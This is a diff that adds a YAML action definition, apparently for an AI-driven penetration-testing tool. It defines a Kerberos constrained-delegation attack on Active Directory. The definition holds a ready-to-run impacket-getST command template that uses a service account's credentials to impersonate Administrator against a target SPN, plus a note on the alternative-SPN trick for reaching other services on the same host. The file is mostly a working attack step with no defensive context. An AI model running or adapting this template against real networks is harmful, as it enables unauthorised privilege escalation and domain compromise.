@@ -1,0 +1,17 @@
+name: constrained_delegation
+category: ad
+description: Exploit constrained delegation via S4U
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-getST '{domain}/{service_account}:{password}' -spn '{target_spn}' -impersonate Administrator -dc-ip {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "S4U2self → S4U2proxy: impersonate any user to the constrained SPN. Alternative SPN trick: change target SPN to any service on same host."
